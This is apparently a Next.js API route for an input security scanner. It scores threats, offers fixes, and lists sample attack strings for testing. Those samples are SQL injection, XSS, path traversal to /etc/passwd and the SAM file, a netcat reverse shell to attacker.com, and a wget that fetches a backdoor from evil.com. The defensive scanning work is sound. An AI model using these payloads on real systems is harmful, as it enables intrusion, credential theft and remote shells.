import { NextRequest, NextResponse } from 'next/server';
import { globalSecurityScanner } from '@/lib/security-scanner';
import { generateTraceId } from '@/lib/tracing';
import { z } from 'zod';

const ScanRequestSchema = z.object({
  inputs: z.record(z.any()),
  config: z.object({
    enableBlocking: z.boolean().optional(),
    logThreats: z.boolean().optional(),
  }).optional(),
});

export async function POST(request: NextRequest) {
  const traceId = generateTraceId();

  try {
    const body = await request.json();
    const parseResult = ScanRequestSchema.safeParse(body);

    if (!parseResult.success) {
      return NextResponse.json(
        {
          success: false,
          error: {
            code: 'INVALID_REQUEST',
            message: 'Invalid scan request format',
            details: parseResult.error.errors,
            traceId,
          },
        },
        { status: 400 }
      );
    }

    const { inputs } = parseResult.data;

    // Perform security scan
    const scanResults = await globalSecurityScanner.scanBatch(inputs, traceId);

    // Aggregate results
    const allThreats = Object.values(scanResults).flatMap(result => result.threats);
    const hasBlockingThreats = Object.values(scanResults).some(result => result.blocked);
    const hasCriticalThreats = allThreats.some(threat => threat.severity === 'critical');
    const hasHighThreats = allThreats.some(threat => threat.severity === 'high');

    // Categorize threats by type
    const threatsByType = allThreats.reduce((acc, threat) => {
      if (!acc[threat.type]) {
        acc[threat.type] = [];
      }
      acc[threat.type].push(threat);
      return acc;
    }, {} as Record<string, typeof allThreats>);

    // Generate security score (0-100, higher is more secure)
    let securityScore = 100;
    allThreats.forEach(threat => {
      switch (threat.severity) {
        case 'critical':
          securityScore -= 25;
          break;
        case 'high':
          securityScore -= 15;
          break;
        case 'medium':
          securityScore -= 5;
          break;
        case 'low':
          securityScore -= 2;
          break;
      }
    });
    securityScore = Math.max(0, securityScore);

    return NextResponse.json({
      success: true,
      data: {
        summary: {
          totalInputs: Object.keys(inputs).length,
          totalThreats: allThreats.length,
          securityScore,
          hasBlockingThreats,
          hasCriticalThreats,
          hasHighThreats,
          riskLevel: securityScore >= 80 ? 'low' : 
                   securityScore >= 60 ? 'medium' :
                   securityScore >= 30 ? 'high' : 'critical',
        },
        threatsByType,
        detailedResults: scanResults,
        recommendations: generateRecommendations(allThreats),
      },
      traceId,
    });
  } catch (error) {
    console.error('Security scan API error:', error);
    return NextResponse.json(
      {
        success: false,
        error: {
          code: 'SECURITY_SCAN_ERROR',
          message: 'Failed to perform security scan',
          traceId,
        },
      },
      { status: 500 }
    );
  }
}

export async function GET(request: NextRequest) {
  const traceId = generateTraceId();

  try {
    // Get scanner statistics
    const stats = globalSecurityScanner.getPatternStats();

    // Get examples of dangerous inputs
    const examples = {
      sqlInjection: [
        "admin'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT username, password FROM users--",
      ],
      xss: [
        "<script>alert('XSS')</script>",
        "javascript:alert(document.cookie)",
        "<img src=x onerror=alert('XSS')>",
      ],
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      ],
      commandInjection: [
        "; cat /etc/passwd",
        "| nc -e /bin/sh attacker.com 4444",
        "$(wget http://evil.com/backdoor.sh)",
      ],
    };

    return NextResponse.json({
      success: true,
      data: {
        scanner: {
          stats,
          description: 'Advanced multi-layered security scanner',
          features: [
            'SQL injection detection',
            'XSS (Cross-site scripting) prevention',
            'Path traversal blocking',
            'Command injection filtering',
            'NoSQL injection detection',
            'LDAP injection prevention',
            'Custom pattern matching',
            'Threat severity scoring',
            'Automatic threat logging',
          ],
        },
        testing: {
          examples,
          instructions: 'Send POST requests with inputs to test security scanning',
          requestFormat: {
            inputs: {
              fieldName1: 'value to scan',
              fieldName2: 'another value',
            },
            config: {
              enableBlocking: true,
              logThreats: true,
            },
          },
        },
      },
      traceId,
    });
  } catch (error) {
    console.error('Security scan info API error:', error);
    return NextResponse.json(
      {
        success: false,
        error: {
          code: 'SECURITY_SCAN_INFO_ERROR',
          message: 'Failed to get security scan information',
          traceId,
        },
      },
      { status: 500 }
    );
  }
}

function generateRecommendations(threats: any[]): string[] {
  const recommendations: string[] = [];
  
  if (threats.length === 0) {
    recommendations.push('✅ No security threats detected. Input appears safe.');
    return recommendations;
  }

  const hasSQL = threats.some(t => t.type === 'sql_injection');
  const hasXSS = threats.some(t => t.type === 'xss');
  const hasPathTraversal = threats.some(t => t.type === 'path_traversal');
  const hasCommandInjection = threats.some(t => t.type === 'command_injection');
  const hasCritical = threats.some(t => t.severity === 'critical');

  if (hasCritical) {
    recommendations.push('🚨 CRITICAL: Immediate action required to block malicious input');
  }

  if (hasSQL) {
    recommendations.push('🛡️ Use parameterized queries and ORM to prevent SQL injection');
    recommendations.push('🔍 Validate and sanitize all database inputs');
  }

  if (hasXSS) {
    recommendations.push('🧹 Sanitize HTML content and encode output');
    recommendations.push('📜 Implement Content Security Policy (CSP) headers');
  }

  if (hasPathTraversal) {
    recommendations.push('📁 Validate file paths and use whitelist approach');
    recommendations.push('🔒 Implement proper access controls for file operations');
  }

  if (hasCommandInjection) {
    recommendations.push('⚙️ Avoid direct command execution with user input');
    recommendations.push('✅ Use safe APIs instead of shell commands');
  }

  recommendations.push('📊 Monitor security logs for patterns and trends');
  recommendations.push('🔄 Regularly update security patterns and rules');

  return recommendations;
}